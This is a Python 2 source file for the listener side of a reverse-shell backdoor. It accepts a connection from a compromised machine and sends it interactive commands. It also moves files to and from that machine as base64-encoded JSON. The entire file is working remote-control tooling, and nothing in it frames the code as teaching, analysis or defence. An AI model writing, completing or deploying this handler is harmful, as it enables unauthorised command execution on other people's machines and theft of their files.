
import socket, json, base64


class Listener:

    def __init__(self, ip, port):
        # options = get_arguments()
        # server = get_ip()
        # port = int(options.port)
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # In case we lose our connection, we reconnect by specifying the lvl,
        # attribute to modify, and 1 to enable it
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        # Listen for incoming connection, specifying a backlog
        # (Number of connection before season starts)
        listener.listen(0)
        print("[+] Waiting for incoming connections...")
        # Returns 2 values (Socket object that represents the connection
        # and the address bounded to the connection)
        (self.connection, address) = listener.accept()
        print("[+] Got a connection from " + str(address))
        print("- Please, type exit to end the season and close the program.")

    def reliable_send(self, data):
        # Wraps the data to a json object
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("ascii")
                # Unwrap the json object to data
                return json.loads(json_data)
            # To prevent errors from data length
            except ValueError:
                continue

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "[+] Download successful."
        except TypeError:
            return "[-] File not found."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_recieve()

    def run(self):
        while True:
            command = raw_input("\n>> ")
            command = command.split(" ")
            if command[0] == "upload":
                if len(command) > 1:
                    # [download, file.txt, content from the file]
                    try:
                        file_content = self.read_file(command[1])
                        command.append(file_content)
                    except IOError:
                        print("[-] File not found.")
                        self.run()
                else:
                    print("[!] Please, specify the file you want to upload.")
            result = self.execute_remotely(command)
            if command[0] == "download":
                if len(command) > 1:
                    result = self.write_file(command[1], result)
                else:
                    print("[!] Please, specify the file you want to download.")
            print(result)

